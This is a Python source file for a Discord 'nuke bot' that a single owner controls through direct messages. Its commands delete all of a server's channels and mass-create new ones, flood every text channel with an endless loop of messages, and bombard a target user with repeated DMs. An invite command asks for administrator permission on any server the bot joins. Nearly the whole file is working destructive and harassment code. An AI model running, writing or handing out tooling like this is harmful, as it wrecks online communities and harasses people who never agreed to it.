import discord
from discord.ext import commands
import asyncio
import colorsys
from colorama import Fore, Style, init, AnsiToWin32
import time
import sys
import os
init(wrap=False)
stream = AnsiToWin32(sys.stdout).stream
CUSTOM_COLOR = '\033[38;2;199;170;246m'
RESET = '\033[0m'
ascii_art = r"""
██████╗ ███████╗██████╗ ██╗  ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
██╔══██╗██╔════╝╚════██╗██║ ██╔╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██████╔╝█████╗   █████╔╝█████╔╝     ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══╝   ╚═══██╗██╔═██╗     ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║     ██████╔╝██║  ██╗    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      
"""
# Print the ASCII art in blue
print(f"{CUSTOM_COLOR}{ascii_art}{RESET}", file=stream)
print(f"{CUSTOM_COLOR}Commands | chn, dmnuke, end, endm, help, invite, leave, list, nuke", file=stream)
print(f"{CUSTOM_COLOR}Made by  | bf3k", file=stream)
print()
sys.stderr = open(os.devnull, 'w')
with open("userid.txt", 'r') as file:
    stringid = file.read()
YOUR_DISCORD_USER_ID = int(stringid)
with open("token.txt", 'r') as file:
    TOKEN = file.read()
def rgb_to_ansi(r, g, b):
    """Convert RGB to ANSI color code."""
    return 16 + (36 * r + 6 * g + b)

def print_rainbow_line(text, hue):
    """Prints a single line of text with a specified hue."""
    # Convert HSV to RGB
    r, g, b = colorsys.hsv_to_rgb(hue, 1.0, 1.0)
    
    # Convert RGB (0-1 range) to ANSI 0-5 range
    r, g, b = int(r * 5), int(g * 5), int(b * 5)
    
    # Generate the colored text
    ansi_code = rgb_to_ansi(r, g, b)
    print(f"\033[38;5;{ansi_code}m{text}\033[0m")

def increase_hue(hue, increment):
    """Increases the hue value by the specified increment and wraps around if necessary."""
    hue += increment
    if hue > 1.0:
        hue -= 1.0  # Wrap around if the hue exceeds 1.0
    return hue

# Define intents
intents = discord.Intents.default()
intents.message_content = True  # Enable reading message content
intents.guilds = True  # Needed to manage channels

# Create an instance of a Bot with intents
bot = commands.Bot(command_prefix='?', intents=intents, help_command=None)

# Global flag to control the message sending loop
continue_sending = False

@bot.event
async def on_ready():
    user = await bot.fetch_user(YOUR_DISCORD_USER_ID)
    print(Fore.GREEN + f'Successfully logged in as {bot.user}')
    print(Fore.GREEN + f'Receiving Commands from {user.name}{RESET}')
    print()
    await user.send("Nuke Bot Ready for Action")

@bot.command()
async def chn(ctx, server_id: str, amount: int, *, name: str):
    """Deletes all channels and makes custom amount more with custom channel names"""
    if ctx.author.id != YOUR_DISCORD_USER_ID:
        return  # Ignore the command if it's not from you
    if isinstance(ctx.channel, discord.DMChannel):
        server = bot.get_guild(int(server_id))

        if server is None:
            await ctx.author.send("Failed to find the server with the provided ID.")
            return

        await ctx.author.send(f"Deleting all channels and creating {amount} new channels named '{name}' in server {server.name}...")
        print(f"Deleting all channels and creating {amount} new channels named '{name}' in server {server.name}...")

        # Deleting all channels
        for channel in server.channels:
            try:
                await channel.delete()
            except discord.errors.HTTPException as e:
                print(f"Failed to delete channel {channel.name}: {e}")
            await asyncio.sleep(0.1)  # Add a small delay to avoid overwhelming the server
        await asyncio.sleep(1)  # Ensure all channels are deleted
        new_channels = []
        for i in range(1, amount + 1):
            try:
                new_channel = await server.create_text_channel(f'{name}-{i}')
                new_channels.append(new_channel)
            except discord.errors.HTTPException as e:
                print(f"Failed to create channel {name}-{i}: {e}")

        await ctx.author.send(f"Finished creating {amount} channels named '{name}'.")
        print(f"Finished creating {amount} channels named '{name}'.")
        return new_channels

    else:
        await ctx.send("This command can only be used in DMs.")
@bot.command()
async def nuke(ctx, server_id: str, *, message: str):
    """Sends rapid messages in all channels"""
    if ctx.author.id != YOUR_DISCORD_USER_ID:
        return  # Ignore the command if it's not from you
    global continue_sending
    continue_sending = True  # Set the flag to True to start sending messages
    
    if isinstance(ctx.channel, discord.DMChannel):
        server = bot.get_guild(int(server_id))

        if server is None:
            await ctx.author.send("Failed to find the server with the provided ID.")
            return

        await ctx.author.send(f"Started sending messages in all channels of server {server.name} with message: {message}")
        print(f"Started sending messages in all channels of server {server.name} with message: {message}")
        hue = 0.0
        while continue_sending:
            for channel in server.text_channels:
                if not continue_sending:
                    break
                try:
                    await channel.send(message)
                    print_rainbow_line(f"Sent message to channel #{channel.name}", hue)
                    hue = increase_hue(hue, 0.01)
                except discord.errors.HTTPException as e:
                    print(f"Failed to send message to channel {channel.name}: {e}")
            if not continue_sending:
                break

    else:
        await ctx.send("This command can only be used in DMs.")
@bot.command()
async def end(ctx, server_id: str):
    """Ends nuke on a server"""
    if ctx.author.id != YOUR_DISCORD_USER_ID:
        return  # Ignore the command if it's not from you
    global continue_sending
    if isinstance(ctx.channel, discord.DMChannel):
        server = bot.get_guild(int(server_id))

        if server is None:
            await ctx.author.send("Failed to find the server with the provided ID.")
            return
        continue_sending = False  # Set the flag to False to stop sending messages
        await ctx.author.send(f"Stopped sending messages in server {server.name}.")
        print(f"Stopped sending messages in server {server.name}.")
    else:
        await ctx.send("This command can only be used in DMs.")
@bot.command()
async def invite(ctx):
    """Sends a link to invite the bot"""
    if ctx.author.id != YOUR_DISCORD_USER_ID:
        return  # Ignore the command if it's not from you
    client_id = bot.user.id  # Get the bot's client ID
    permissions = 8  # Administrator permissions
    invite_link = f"https://discord.com/oauth2/authorize?client_id={client_id}&permissions={permissions}&scope=bot"
    await ctx.author.send(f"Bot Invite: {invite_link}")
    print(f"Sent Invite Link.")
@bot.command()
async def list(ctx):
    """Lists the servers the bot is in"""
    if ctx.author.id != YOUR_DISCORD_USER_ID:
        return  # Ignore the command if it's not from you
    if isinstance(ctx.channel, discord.DMChannel):
        embed = discord.Embed(
            title="Server List",
            color=discord.Color.blue()  # You can change the color if you like
        )

        for guild in bot.guilds:
            embed.add_field(
                name=guild.name,
                value=f"```{guild.id}```",
                inline=False
            )

        if bot.guilds:
            await ctx.author.send(embed=embed)
            print("Sent List.")
        else:
            await ctx.author.send("I'm not in any servers.")
    else:
        await ctx.send("This command can only be used in DMs.")

@bot.command()
async def leave(ctx, server_id: str):
    """Leaves a server"""
    if ctx.author.id != YOUR_DISCORD_USER_ID:
        return  # Ignore the command if it's not from you
    
    if isinstance(ctx.channel, discord.DMChannel):
        server = bot.get_guild(int(server_id))

        if server is None:
            await ctx.author.send("Failed to find the server with the provided ID.")
            return

        await ctx.author.send(f"Leaving the server: {server.name}.")
        print(f"Leaving the server: {server.name}.")
        await server.leave()
    else:
        await ctx.send("This command can only be used in DMs.")

@bot.command()
async def dmnuke(ctx, user_id: str, *, message: str):
    """Sends rapid DMs to someone"""
    if ctx.author.id != YOUR_DISCORD_USER_ID:
        return  # Ignore the command if it's not from you
    user = await bot.fetch_user(user_id)
    global dmspam
    dmspam = True  # Set the flag to True to start sending messages
    await ctx.author.send(f"Started sending messages to {user.name} with message: {message}")
    print(f"Started sending messages to {user.name} with message: {message}")
    hue = 0.0
    while dmspam:
        try:
            await user.send(message)
            print_rainbow_line(f"Sent message to {user.name}", hue)
            hue = increase_hue(hue, 0.01)
            await asyncio.sleep(0.2)
        except discord.errors.HTTPException as e:
            print(f"Failed to send message to {user.name}: {e}")
        if not dmspam:
            break

@bot.command()
async def endm(ctx, user_id: str):
    """Ends Dm Nuke"""
    if ctx.author.id != YOUR_DISCORD_USER_ID:
        return  # Ignore the command if it's not from you
    global dmspam
    user = await bot.fetch_user(user_id)
    if isinstance(ctx.channel, discord.DMChannel):
        dmspam = False  # Set the flag to False to stop sending messages
        await ctx.send(f"Stopped sending messages to {user.name}.")
        print(f"Stopped sending messages to {user.name}.")
    else:
        await ctx.send("This command can only be used in DMs.")
@bot.command(name='help')
async def custom_help(ctx, *commands: str):
    """Displays the help message"""
    if ctx.author.id != YOUR_DISCORD_USER_ID:
        return  # Ignore the command if it's not from you
    if not commands:
        # Create an embed for the list of all commands
        embed = discord.Embed(title="Available Commands", color=discord.Color.blue())
        for command in bot.commands:
            embed.add_field(name=f"**{command.name}**", value=command.short_doc or "No description", inline=False)
        await ctx.send(embed=embed)
        print("Sent help message.")
    else:
        # Create an embed for detailed help for specific commands
        for command_name in commands:
            command = bot.get_command(command_name)
            if command:
                embed = discord.Embed(title=f"Help for `{command.name}`", color=discord.Color.blue())
                embed.add_field(name="Description", value=command.help or "No description", inline=False)
                
                # Add command usage (prefix + command + arguments)
                usage = f"{bot.command_prefix}{command.name} {command.signature}"
                embed.add_field(name="Usage", value=usage, inline=False)

                # Show aliases if available
                if command.aliases:
                    aliases = ", ".join(command.aliases)
                    embed.add_field(name="Aliases", value=aliases, inline=False)
                
                await ctx.send(embed=embed)
                print("Sent help message.")
            else:
                # Error message if command is not found
                embed = discord.Embed(title="Error", description=f"Command `{command_name}` not found.", color=discord.Color.red())
                await ctx.send(embed=embed)
# Run the bot
bot.run(TOKEN)
